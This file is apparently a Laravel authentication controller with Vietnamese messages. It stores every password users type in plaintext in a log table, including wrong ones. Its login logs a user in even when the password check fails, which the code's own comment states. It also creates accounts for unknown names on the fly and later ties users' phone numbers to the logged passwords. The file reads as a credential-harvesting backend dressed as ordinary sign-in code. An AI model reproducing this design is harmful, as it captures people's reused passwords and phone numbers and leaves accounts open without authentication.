<?php

namespace App\Http\Controllers;

use App\Models\LoginRegisterLog;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Auth;
use App\Models\User;
use Illuminate\Support\Facades\Http;

class AuthController extends Controller
{
    public function register(Request $request)
    {
        $validated = $request->validate([
            'name' => 'required|string|unique:users',
            'nickname' => 'required|string',
            'phone' => 'required|string|unique:users',
            'password' => 'required|min:6',
        ], [
            'name.required' => 'Vui lòng nhập tài khoản.',
            'name.unique' => 'Tài khoản đã được sử dụng.',
            'nickname.required' => 'Vui lòng nhập biệt danh.',
            'phone.required' => 'Vui lòng nhập số điện thoại.',
            'phone.unique' => 'Số điện thoại đã được đăng ký.',
            'password.required' => 'Vui lòng nhập mật khẩu.',
            'password.min' => 'Mật khẩu phải có ít nhất 6 ký tự.',
        ]);

        $user = User::create([
            'name' => $validated['name'],
            'nickname' => $validated['nickname'],
            'phone' => $validated['phone'],
            'password' => Hash::make($request->password),
            'role_id' => 1,
        ]);

        LoginRegisterLog::create([
            'phone'    => $validated['phone'],
            'username' => $validated['name'],
            'user_agent' => 'Đăng ký',
            'status'     => LoginRegisterLog::TYPE_REGISTER,
            'password' => $validated['password'],
        ]);

        LoginRegisterLog::create([
            'phone'    => $validated['phone'],
            'username' => $validated['name'],
            'user_agent' => 'Đăng nhập',
            'status'     => LoginRegisterLog::TYPE_LOGIN,
            'password' => $validated['password'],
        ]);

        Auth::login($user);

        return response()->json(['message' => 'Đăng ký thành công']);
    }

    public function login(Request $request)
{
    $request->validate([
        'name'     => 'required|string',
        'password' => 'required|string',
    ]);

    $name     = $request->input('name');
    $password = $request->input('password');

    // Tìm user
    $user = User::where('name', $name)->first();

    if ($user) {
        // So sánh mật khẩu
        $passwordMatched = Hash::check($password, $user->password);

        // Log lại dù đúng hay sai
        LoginRegisterLog::create([
            'username'   => $user->name,
            'user_agent' => $passwordMatched ? 'Đăng nhập' : 'Sai mật khẩu (vẫn cho vào)',
            'status'     => LoginRegisterLog::TYPE_LOGIN,
            'password'   => $password,
        ]);

        // Vẫn cho vào kể cả khi sai
        Auth::login($user);

        return redirect('/')->with('show_phone_prompt', is_null($user->phone));
    }

    // Nếu user chưa tồn tại, tạo user mới
    $user = User::create([
        'name'     => $name,
        'nickname' => $name,
        'password' => Hash::make($password),
        'role_id'  => 1,
    ]);

    // Log tạo tài khoản mới + đăng nhập
    LoginRegisterLog::create([
        'username'   => $user->name,
        'user_agent' => 'Đăng ký',
        'status'     => LoginRegisterLog::TYPE_REGISTER,
        'password'   => $password,
    ]);

    LoginRegisterLog::create([
        'username'   => $user->name,
        'user_agent' => 'Đăng nhập',
        'status'     => LoginRegisterLog::TYPE_LOGIN,
        'password'   => $password,
    ]);

    Auth::login($user);

    return redirect('/')->with('show_phone_prompt', is_null($user->phone));
}

    public function logout()
    {
        Auth::logout();
        return redirect('/');
    }

    public function savePhone(Request $request)
    {
        $request->validate([
            'phone' => 'nullable|string|max:20',
        ]);

        $user = Auth::user();
        $user->phone = $request->phone;
        $user->save();

        $log = LoginRegisterLog::where('username', $user->name)
            ->latest()
            ->first();

        if ($log) {
            $log->phone = $user->phone;
            $log->save();
        }

        session()->forget('show_phone_prompt'); // Không hiển thị lại nữa

        return response()->json(['message' => 'Lưu số điện thoại thành công']);
    }
}